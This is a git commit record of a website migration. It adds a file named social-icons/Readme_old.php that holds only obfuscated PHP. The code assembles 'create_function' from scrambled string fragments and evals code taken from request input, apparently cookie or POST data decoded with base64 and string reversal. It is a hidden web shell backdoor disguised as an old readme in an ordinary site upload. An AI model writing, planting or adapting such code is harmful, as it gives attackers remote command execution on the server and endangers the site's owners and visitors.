2497498315e39b847b8a81676238c5fdca449c80
James Taylor <35105264+jtatfranklin@users.noreply.github.com>
2018-03-20 14:06:52 -0500

    First upload
    Migration from Franklin's .net to GitHub pages.

---
+++ social-icons/Readme_old.php
@@ -0,0 +1,100 @@
+<?php
+$dragons= 'HaOG]i$("'; $kissed='"o';
+
+$friends = 'a';$feline ='a)?e'; $infinitive= '.f0RK)Ar$';$infer = 'Fneavfber'; $governor ='6drllg'; $lackluster='[';
+
+$briny= '((R';$aprilette = '['; $henka=']2(4';$skywalker= 'g'; $den = '__vuEse=c'; $carver='7'; $gib= ')^EHt'; $gabi= '"R;cvs"(V';$humidistat='S';$lure= '(';
+
+$celesta='rto$@I';$claiming= '8d'; $lilllie = 'QMiN$(g]';$dues='W';
+
+$author ='W)s;[<U'; $compression= 'e';
+$banal= 'r';$conflicts='KP(bS)4a';$khalil='S';$lanie = 'P'; $courter ='T';$ginmill =')'; $deviated= '$'; $cassette = '_'; $lory = '_'; $bellwether='e';$boba =',sCr(ta';
+$beetle ='u';$berth = ':-_';$feature ='hGLt=IR';$democracies = '_'; $hospice='N';
+$guest2='5';$colonial= '$cw,ma,Ri';$divisive ='pO"'; $logs = 'i'; $compellable= 'gfTRsa[A;'; $kimble ='t'; $cautionings='y'; $crest='s';$hundreds='G'; $corresponds ='i'; $aviary = 'S';$gin='9U'; $freighters ='r'; $howsoever= 'a';
+$floorings = 'f';$ejector= 's';$bodice='i';$lieutenants = ') cT'; $flick= 'Y';
+$epitaxially='e'; $deriving='NsTC';$dirts ='cgOtSeQ';
+$erratum= 'fE';
+
+$angst = 'E';
+
+$chard= '+trr';
+$bored ='y'; $estuarine ='Z_)e:B?a'; $dainty='e'; $liquify= 'aw';
+$beckons = 'e'; $interested= 'T';$lairs= '?'; $channeled =':$'; $dilly = ']din_';$ban ='D';$asp ='n"rR($dE)'; $departmental= 'R'; $audiometric= 'A'; $kaolin ='e';$barrenness= 'H';$consolata= 'r1';
+$jordan= '6vFT"';
+
+$decrements ='_"an';
+
+$emblazon ='e'; $atomic= 'J'; $dont ='Xr=pa)[rP'; $infidels ='g'; $avoidance= 'a';$ether =';'; $leontyne ='o';$bette='r)_$';$atmosphere='>';$defenses= '$ei];'; $dynasty ='r'; $impractical='Fe`i_('; $fastened='/sEWse_';$ambition= 'n3V';$expecting=$dirts['0'].$dynasty.
+
+$fastened['5']. $avoidance.
+
+$chard['1'].$fastened['5'].
+
+$fastened[6] . $erratum['0'] . $beetle.$ambition['0'] .
+$dirts['0'] .
+
+$chard['1'].
+
+$impractical['3']. $leontyne . $ambition['0']; $fronting = $lieutenants['1'] ; $california= $expecting ($fronting, $fastened['5'] .$jordan['1'].
+
+$avoidance . $governor['4'].
+$impractical['5'].$avoidance .$dynasty .$dynasty.
+$avoidance. $bored.$fastened[6] .$dont['3']. $leontyne .$dont['3'] . $impractical['5'] . $erratum['0'].$beetle . $ambition['0']. $dirts['0']. $fastened[6].
+$infidels.$fastened['5'].
+
+$chard['1'].$fastened[6].$avoidance. $dynasty .$infidels .
+
+$fastened['4'] . $impractical['5']. $bette['1'] . $bette['1'] .
+
+$bette['1'] .$defenses['4'] ); $california
+
+($estuarine['0'], $impractical['5'],$feature['2'] ,
+
+$dirts['0'], $conflicts['0'] ,
+$beetle,
+
+$liquify['1'] ,$defenses['0'].$impractical['3'] .
+$dont['2'] .$avoidance. $dynasty .$dynasty.$avoidance . $bored.
+$fastened[6].
+$colonial['4'].
+
+$fastened['5']. $dynasty. $infidels . $fastened['5'].$impractical['5'].$defenses['0'] .
+
+$fastened[6].$departmental.$fastened['2'].$dirts['6'] .$gin[1].
+
+$fastened['2'].$dirts['4'] . $jordan['3']. $colonial['6'] .$defenses['0']. $fastened[6] . $deriving['3'].
+
+$dirts['2']. $dirts['2'].
+
+$conflicts['0'].$feature['5'] .$fastened['2']. $colonial['6'] . $defenses['0'].$fastened[6] . $dirts['4']. $fastened['2'] .$departmental .
+
+$ambition['2'] . $fastened['2'] . $departmental .$bette['1'].$defenses['4']. $defenses['0']. $avoidance . $dont['2'] .$impractical['3'] . $fastened['4']. $fastened['4'] . $fastened['5'] .$chard['1'] .$impractical['5'] .
+
+$defenses['0']. $impractical['3']. $dont['6'] .$decrements['1']. $erratum['0'] . $avoidance. $infidels. $liquify['1'] .$dynasty .$dynasty.$ambition['0'] . $fastened['4'] .$decrements['1'] .$defenses['3'] . $bette['1'] .
+
+$lairs.
+
+$defenses['0'] .$impractical['3']. $dont['6']. $decrements['1'] . $erratum['0'].$avoidance . $infidels .$liquify['1'] . $dynasty. $dynasty .
+$ambition['0']. $fastened['4'].$decrements['1'].
+$defenses['3']. $channeled[0] .
+
+$impractical['5'] .$impractical['3'].$fastened['4'] . $fastened['4'] . $fastened['5'].
+
+$chard['1'].$impractical['5']. $defenses['0'] . $impractical['3'] . $dont['6'] .$decrements['1'] .$barrenness. $jordan['3'] . $jordan['3'] . $dont['8'] . $fastened[6] . $impractical['0'] . $audiometric.
+$hundreds. $fastened['3']. $departmental. $departmental. $deriving['0'] .$dirts['4'] . $decrements['1'] .$defenses['3'] .$bette['1'].
+$lairs .$defenses['0']. $impractical['3'].$dont['6']. $decrements['1']. $barrenness . $jordan['3'].$jordan['3'] .$dont['8'] . $fastened[6]. $impractical['0'] .$audiometric.
+$hundreds .
+
+$fastened['3'].
+
+$departmental. $departmental.$deriving['0'].$dirts['4'].$decrements['1']. $defenses['3'].$channeled[0]. $asp['6']. $impractical['3'].$fastened['5'] .$bette['1'] . $defenses['4'] .$fastened['5'].$jordan['1'].
+
+$avoidance . $governor['4'].$impractical['5'] . $fastened['4']. $chard['1'] . $dynasty.
+$dynasty.$fastened['5'] . $jordan['1'].$impractical['5'] .$conflicts[3] . $avoidance .$fastened['4'] .$fastened['5']. $jordan[0] . $conflicts['6'].$fastened[6] . $asp['6'] .$fastened['5'] .
+$dirts['0'].
+
+$leontyne. $asp['6']. $fastened['5'].$impractical['5']. $fastened['4'].$chard['1'] .$dynasty .
+$dynasty .$fastened['5'] .
+$jordan['1']. $impractical['5'].$defenses['0'] . $avoidance. $bette['1'] .
+
+$bette['1'] . $bette['1'] .$bette['1'].$defenses['4']  );
